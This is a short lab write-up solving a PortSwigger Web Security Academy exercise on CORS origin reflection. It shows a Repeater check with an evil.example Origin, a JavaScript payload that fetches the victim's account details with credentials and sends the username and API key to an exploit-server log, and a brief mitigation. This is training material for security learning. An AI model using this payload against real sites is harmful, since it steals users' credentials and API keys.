# Lab 01 — CORS vulnerability with basic origin reflection

> **Practitioner** · [Official lab](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)

**Entry point:** `/accountDetails` reflects the `Origin` header into
`Access-Control-Allow-Origin` and sets `Access-Control-Allow-Credentials: true`.

## Solution

1. Confirm in Repeater: add `Origin: evil.example` → response contains
   `Access-Control-Allow-Origin: evil.example` + credentials allowed.
2. Host the exfiltration script on the exploit server:

```html
<script>
fetch('https://YOUR-LAB-ID.web-security-academy.net/accountDetails',
      {credentials:'include'})
  .then(r => r.json())
  .then(d => location = 'https://YOUR-EXPLOIT-SERVER/log?data=' +
        encodeURIComponent(d.username + ':' + d.apiKey));
</script>
```

3. Deliver to victim — `credentials:'include'` sends their cookie, CORS lets
   your origin read the JSON, and the API key lands in your log — lab solved.

## Mitigation

Never reflect arbitrary origins; allow-list exact origins and keep
`Access-Control-Allow-Credentials` off unless mandatory.
